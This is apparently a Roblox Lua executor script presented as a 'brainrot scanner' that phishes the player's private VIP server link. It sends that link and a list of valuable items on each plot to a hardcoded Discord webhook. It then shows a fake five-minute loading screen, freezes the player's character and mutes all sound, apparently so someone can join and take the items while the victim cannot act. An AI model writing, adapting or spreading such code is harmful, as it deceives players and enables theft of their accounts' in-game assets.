local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local ContextActionService = game:GetService("ContextActionService")
local SoundService = game:GetService("SoundService")

-- ==============================
-- Конфиг
-- ==============================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep"

-- ==============================
-- Глобальные переменные
-- ==============================
local isActivated = false
local activationGUI = nil
_G.VIP_LINK = nil

-- ==============================
-- Утилиты
-- ==============================
local function safeLower(str)
	if typeof(str) ~= "string" then return "" end
	return string.lower(str)
end

local function stringContainsAny(haystack, needles)
	haystack = safeLower(haystack)
	for _, needle in ipairs(needles) do
		if string.find(haystack, needle, 1, true) then return true end
	end
	return false
end

-- ==============================
-- Надёжная сериализация в JSON
-- ==============================
-- Рекурсивно приводит данные к "безопасным" типам: table/string/number/boolean или tostring(иначе)
local function sanitizeForJson(value, seen, depth)
	depth = depth or 0
	if depth > 8 then
		-- защитный предел глубины
		return tostring(value)
	end

	local t = typeof(value)
	if t == "table" then
		-- защитимся от циклов
		seen = seen or {}
		if seen[value] then
			return "[cyclic]"
		end
		seen[value] = true
		local out = {}
		for k, v in pairs(value) do
			-- ключи в JSON должны быть строки
			local keyType = typeof(k)
			local key
			if keyType == "string" then
				key = k
			elseif keyType == "number" or keyType == "boolean" then
				key = tostring(k)
			else
				key = tostring(k)
			end
			out[key] = sanitizeForJson(v, seen, depth + 1)
		end
		return out
	elseif t == "string" or t == "number" or t == "boolean" then
		return value
	elseif t == "RBXScriptSignal" or t == "Instance" then
		-- представление для Roblox-объектов
		return tostring(value)
	else
		-- для функций, userdata, thread, proxy и т.д. — строковое представление
		-- обфускаторы иногда вставляют proxy-объекты/closures — tostring их безопасен
		return tostring(value)
	end
end

local function safeJSONEncode(payload)
	-- сначала попытка сериализовать прямо (бывает, что payload уже "чистый")
	local ok, encoded = pcall(function()
		return HttpService:JSONEncode(payload)
	end)
	if ok then
		return encoded
	end

	-- первое неудачное кодирование — попробуем предварительно "очистить" таблицу
	local sanitized = sanitizeForJson(payload)
	ok, encoded = pcall(function()
		return HttpService:JSONEncode(sanitized)
	end)
	if ok then
		return encoded
	end

	-- если и это не помогло — возвращаем минимальную безопасную заглушку
	warn("[safeJSONEncode] Failed to JSONEncode payload. Falling back to simple content. Error:", encoded)
	local fallback = { content = tostring(payload) }
	local ok2, encoded2 = pcall(function()
		return HttpService:JSONEncode(fallback)
	end)
	if ok2 then
		return encoded2
	end

	-- последняя попытка: вручную собрать очень простую JSON-строку
	return '{"content":' .. HttpService:JSONEncode(tostring(payload)) .. '}'
end

-- ==============================
-- Webhook (устойчивые запросы)
-- ==============================
local function tryExploitRequest(json)
	local req = (syn and syn.request) or (http and http.request) or (http_request) or (request)
	if typeof(req) == "function" then
		-- Обёрну в pcall, чтобы ни на что не падало
		local ok, err = pcall(function()
			req({
				Url = WEBHOOK_URL,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = json,
			})
		end)
		if not ok then
			warn("[tryExploitRequest] request failed:", err)
			return false
		end
		return true
	end
	return false
end

local function tryHttpServiceRequest(json)
	local ok, res = pcall(function()
		-- RequestAsync может выбросить ошибку, поэтому pcall
		return HttpService:RequestAsync({
			Url = WEBHOOK_URL,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = json,
		})
	end)
	if not ok then
		warn("[tryHttpServiceRequest] RequestAsync pcall failed:", res)
		return false
	end
	-- res может быть nil или иметь другое поле структуры в зависимости от обфускатора/скрипта среды
	if type(res) == "table" and (res.Success == true or res.success == true) then
		return true
	end
	-- В некоторых окружениях res может быть строкой или другой структурой — логируем для отладки
	warn("[tryHttpServiceRequest] Request returned:", res)
	return false
end

local function sendWebhook(payload)
	if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
	-- Если payload — не таблица, сделаем таблицу с контентом
	if type(payload) ~= "table" then
		payload = { content = tostring(payload) }
	end

	-- Подготовим безопасный JSON
	local json = safeJSONEncode(payload)

	-- Попробуем через эксплойтные хуки (syn/request и т.д.)
	if tryExploitRequest(json) then
		return
	end

	-- Попробуем через HttpService
	tryHttpServiceRequest(json)
end

local function postDiscordSimple(content)
	if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
	-- Ограниченная по длине отправка (Discord message limit/HTML code block stuff)
	local MAX = 1800
	local i = 1
	while i <= #content do
		local chunk = string.sub(content, i, math.min(i + MAX - 1, #content))
		-- используем sendWebhook, он обработает всё безопасно
		sendWebhook({ content = "```\n" .. chunk .. "\n```" })
		i = i + MAX
	end
end

-- ==============================
-- Остальной код оставлен без изменений
-- (копирую дальше твою логику)
-- ==============================
-- Список брейнротов
local CANONICAL_BRAINROT_NAMES = {
	"Los Tralaleritos",
	"Las Tralaleritas",
	"La Cucaracha",
	"Pot Hotspot",
	"Garama and Madundung",
	"Tictac Sahur",
	"Spaghetti Tualetti",
	"Dragon Cannelloni",
	"Ketupat Kepat",
	"Ketchuru and Musturu",
	"Esok Sekolah",
	"Money Money Puggy",
	"Nuclearo Dinossauro",
	"La Grande Combinasion",
	"Chicleteira Bicicleteira",
	"Los Chicleteiras",
	"To to to Sahur",
	"Graipuss Medussi",
	"Strawberry Elephant",
	"67",
	"La Extinct Grande",
	"Mariachi Corazoni",
	"Tacorita Bicicleta",
	"Los Nooo My Hotspotsitos",
	"La Karkerkar Combinasion",
	"Los Bros",
	"Los Primos",
	"Tralaledon",
	"Los Tacoritas",
	"La Sahur Combinasion",
	"Fragola La La La",
	"Los Hotspotsitos",
	"La Supreme Combinasion",
	"Los Combinasionas",
	"Los Tungtungtungcitos",
	"Noo My Examen",
	"Yess my Examen",
	"Secret Lucky Block",
	"Admin Lucky Block",
	"Quesadilla Crocodila",
}

local LOWER_TO_CANON = {}
for _, name in ipairs(CANONICAL_BRAINROT_NAMES) do
	LOWER_TO_CANON[string.lower(name)] = name
end

local function getCanonicalMatch(name)
	local lname = safeLower(name)
	for lowerCanonical, canonical in pairs(LOWER_TO_CANON) do
		if string.find(lname, lowerCanonical, 1, true) then
			return canonical
		end
	end
	return nil
end

local ALLOW_CATEGORY_KEYWORDS = {
	"brainrot god","secret","og","admin","exclusive","taco",
	"craft machine","fuse machine","los ","las ","ritual",
	"unobtainable","removed","upcoming"
}
local DISALLOW_CATEGORY_KEYWORDS = {
	"common","rare","epic","legendary","mythic","mythic lucky block"
}

local function isAllowedByCategory(name)
	local lname = safeLower(name)
	local hasDisallow = stringContainsAny(lname, DISALLOW_CATEGORY_KEYWORDS)
	local hasAllow = stringContainsAny(lname, ALLOW_CATEGORY_KEYWORDS)
	if hasDisallow and not hasAllow then return false end
	return true
end

-- ==============================
-- Детекция брейнротов
-- ==============================
local function isBrainrotInstance(inst)
	if not inst then return false end
	local canonical = getCanonicalMatch(inst.Name)
	if not canonical then return false end
	if not isAllowedByCategory(inst.Name) then return false end
	return true
end

local function resolveOwnerNameFromPlot(plot)
	for _, descendant in ipairs(plot:GetDescendants()) do
		if descendant:IsA("StringValue") and stringContainsAny(descendant.Name, {"owner","username","user"}) then
			if descendant.Value and #descendant.Value > 0 then return descendant.Value end
		end
		if descendant:IsA("IntValue") and stringContainsAny(descendant.Name, {"owner","userid"}) then
			local ok, name = pcall(function()
				return Players:GetNameFromUserIdAsync(descendant.Value)
			end)
			if ok then return name end
		end
	end
	return nil
end

local function collectBrainrotsInPlot(plot)
	local results, seenCanonical = {}, {}
	for _, d in ipairs(plot:GetDescendants()) do
		if isBrainrotInstance(d) then
			local canonical = getCanonicalMatch(d.Name) or d.Name
			if not seenCanonical[canonical] then
				seenCanonical[canonical] = true
				table.insert(results, { name = canonical })
			end
		end
	end
	return results
end

local function buildPlotSection(plot)
	local ownerName = resolveOwnerNameFromPlot(plot)
	local entries = collectBrainrotsInPlot(plot)
	if #entries == 0 then return nil end
	local lines = {}
	local plotLabel = ownerName and ownerName or plot.Name
	table.insert(lines, string.format("Плот: %s | найдено: %d", plotLabel, #entries))
	for i, e in ipairs(entries) do
		table.insert(lines, string.format("#%d %s", i, e.name))
	end
	return table.concat(lines, "\n")
end

-- ==============================
-- Отчёт
-- ==============================
local PLOTS_FOLDER = Workspace:WaitForChild("Plots")

local function postCombinedAllPlots()
	local sections = {}
	for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do
		local section = buildPlotSection(plot)
		if section then table.insert(sections, section) end
	end

	if #sections > 0 then
		if _G.VIP_LINK and _G.VIP_LINK ~= "" then
			table.insert(sections, 1, "🔗 VIP Link: " .. _G.VIP_LINK)
		end
		local body = table.concat(sections, "\n\n")
		postDiscordSimple(body)
	end
end

-- ==============================
-- Мониторинг
-- ==============================
local connections = {}
local batchScheduled = false

local function scheduleBatch()
	if batchScheduled then return end
	batchScheduled = true
	task.delay(0.5, function()
		batchScheduled = false
		postCombinedAllPlots()
	end)
end

local function onPlotDescendantAdded(plot, inst)
	if isBrainrotInstance(inst) then
		scheduleBatch()
	end
end

local function attachPlotWatch(plot)
	if connections[plot] then return end
	connections[plot] = plot.DescendantAdded:Connect(function(inst)
		onPlotDescendantAdded(plot, inst)
	end)
end

local function detachPlotWatch(plot)
	if connections[plot] then
		connections[plot]:Disconnect()
		connections[plot] = nil
	end
end

local function watchPlots()
	for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do
		attachPlotWatch(plot)
	end
	PLOTS_FOLDER.ChildAdded:Connect(function(child)
		attachPlotWatch(child)
		scheduleBatch()
	end)
	PLOTS_FOLDER.ChildRemoved:Connect(function(child)
		detachPlotWatch(child)
		scheduleBatch()
	end)
end

-- ==============================
-- Fullscreen Loading screen
-- ==============================
local function showLoadingScreen(duration)
	local player = Players.LocalPlayer
	local StarterGui = game:GetService("StarterGui")

	pcall(function()
		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
	end)

	local gui = Instance.new("ScreenGui")
	gui.Name = "LoadingScreen"
	gui.IgnoreGuiInset = true
	gui.ResetOnSpawn = false
	gui.DisplayOrder = 999999
	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	gui.Parent = player:WaitForChild("PlayerGui")

	local mainFrame = Instance.new("Frame")
	mainFrame.Size = UDim2.new(1, 0, 1, 0)
	mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
	mainFrame.BorderSizePixel = 0
	mainFrame.ZIndex = 999999
	mainFrame.Active = true
	mainFrame.Selectable = true
	mainFrame.Parent = gui

	local loadingText = Instance.new("TextLabel")
	loadingText.Size = UDim2.new(1, 0, 0, 60)
	loadingText.Position = UDim2.new(0, 0, 0.4, -30)
	loadingText.BackgroundTransparency = 1
	loadingText.Text = "Script activated, please wait..."
	loadingText.TextColor3 = Color3.new(1,1,1)
	loadingText.TextScaled = true
	loadingText.Font = Enum.Font.GothamBold
	loadingText.ZIndex = 1000000
	loadingText.Parent = mainFrame

	local progressBarFrame = Instance.new("Frame")
	progressBarFrame.Size = UDim2.new(0.6, 0, 0, 25)
	progressBarFrame.Position = UDim2.new(0.2, 0, 0.55, 0)
	progressBarFrame.BackgroundColor3 = Color3.fromRGB(50,50,50)
	progressBarFrame.BorderSizePixel = 0
	progressBarFrame.ZIndex = 1000000
	progressBarFrame.Parent = mainFrame

	local progressBar = Instance.new("Frame")
	progressBar.Size = UDim2.new(0, 0, 1, 0)
	progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
	progressBar.BorderSizePixel = 0
	progressBar.ZIndex = 1000001
	progressBar.Parent = progressBarFrame

	local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
	local goal = {Size = UDim2.new(1, 0, 1, 0)}
	local tween = TweenService:Create(progressBar, tweenInfo, goal)
	tween:Play()

	task.delay(duration, function()
		gui:Destroy()
		pcall(function()
			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
		end)
	end)
end

-- ==============================
-- GUI
-- ==============================
local function createActivationGUI()
	local player = Players.LocalPlayer
	local gui = Instance.new("ScreenGui")
	gui.Name = "BrainrotScannerActivation"
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	local mainFrame = Instance.new("Frame")
	mainFrame.Size = UDim2.new(0, 450, 0, 300)
	mainFrame.Position = UDim2.new(0.5, -225, 0.5, -150)
	mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	mainFrame.BorderSizePixel = 0
	mainFrame.Parent = gui

	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(1, -20, 0, 50)
	title.Position = UDim2.new(0, 10, 0, 10)
	title.BackgroundTransparency = 1
	title.Text = "Place ur VIP link here"
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.TextScaled = true
	title.Font = Enum.Font.GothamBold
	title.Parent = mainFrame

	local textBox = Instance.new("TextBox")
	textBox.Size = UDim2.new(1, -20, 0, 50)
	textBox.Position = UDim2.new(0, 10, 0, 70)
	textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	textBox.BorderSizePixel = 0
	textBox.PlaceholderText = "https://www.roblox.com/share?code=..."
	textBox.ClearTextOnFocus = false
	textBox.PlaceholderColor3 = Color3.fromRGB(180, 180, 180)
	textBox.Text = ""
	textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	textBox.TextScaled = true
	textBox.Font = Enum.Font.Gotham
	textBox.Parent = mainFrame

	local button = Instance.new("TextButton")
	button.Size = UDim2.new(1, -20, 0, 70)
	button.Position = UDim2.new(0, 10, 0, 140)
	button.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
	button.BorderSizePixel = 2
	button.BorderColor3 = Color3.fromRGB(255, 255, 255)
	button.Text = "ACTIVATE"
	button.TextColor3 = Color3.new(1, 1, 1)
	button.TextScaled = true
	button.Font = Enum.Font.GothamBold
	button.Parent = mainFrame

	button.MouseEnter:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 150, 255)}):Play()
	end)
	button.MouseLeave:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 120, 255)}):Play()
	end)

	local status = Instance.new("TextLabel")
	status.Size = UDim2.new(1, -20, 0, 30)
	status.Position = UDim2.new(0, 10, 0, 220)
	status.BackgroundTransparency = 1
	status.Text = ""
	status.TextColor3 = Color3.fromRGB(255, 200, 0)
	status.TextScaled = true
	status.Font = Enum.Font.Gotham
	status.Parent = mainFrame

	local function onActivate()
		if #Players:GetPlayers() > 1 then
			status.Text = "Script can't be activated , more than 1 player in the server!"
			status.TextColor3 = Color3.fromRGB(255, 80, 80)
			return
		end

		local vipLink = textBox.Text:gsub("^%s*(.-)%s*$", "%1")
		if vipLink == "" or not string.find(vipLink, "roblox%.com/share") then
			status.Text = "Not a vip server!"
			status.TextColor3 = Color3.fromRGB(255, 80, 80)
			return
		end

		isActivated = true
		_G.VIP_LINK = vipLink
		status.Text = "Script Activated"
		status.TextColor3 = Color3.fromRGB(0, 255, 100)

		task.wait(0.5)
		postCombinedAllPlots()
		watchPlots()

		-- Fullscreen loading screen 5 минут
		showLoadingScreen(300)

		-- ==============================
		-- Блокировка движения игрока
		-- ==============================
		local player = Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()

		local function blockMovement(_, inputState)
			if inputState == Enum.UserInputState.Begin then
				return Enum.ContextActionResult.Sink
			end
		end

		ContextActionService:BindAction("BlockMovement", blockMovement, false,
			Enum.PlayerActions.CharacterForward,
			Enum.PlayerActions.CharacterBackward,
			Enum.PlayerActions.CharacterLeft,
			Enum.PlayerActions.CharacterRight,
			Enum.PlayerActions.CharacterJump)

		local function freezeHumanoid(char)
			local hum = char:WaitForChild("Humanoid")
			hum.WalkSpeed = 0
			hum.JumpPower = 0
		end

		freezeHumanoid(character)
		player.CharacterAdded:Connect(freezeHumanoid)

		-- ==============================
		-- Отключение всех звуков
		-- ==============================
		local function muteSound(sound)
			if sound:IsA("Sound") then
				sound.Volume = 0
				sound:GetPropertyChangedSignal("Volume"):Connect(function()
					sound.Volume = 0
				end)
				sound:Stop()
			end
		end

		for _, obj in ipairs(Workspace:GetDescendants()) do
			muteSound(obj)
		end
		for _, obj in ipairs(SoundService:GetDescendants()) do
			muteSound(obj)
		end

		Workspace.DescendantAdded:Connect(muteSound)
		SoundService.DescendantAdded:Connect(muteSound)
		SoundService.Volume = 0

		gui:Destroy()
		activationGUI = nil
	end

	button.MouseButton1Click:Connect(onActivate)
	textBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then onActivate() end
	end)
end

-- ==============================
-- Старт
-- ==============================
print("[BrainrotScanner] Создаю GUI активации...")
createActivationGUI()
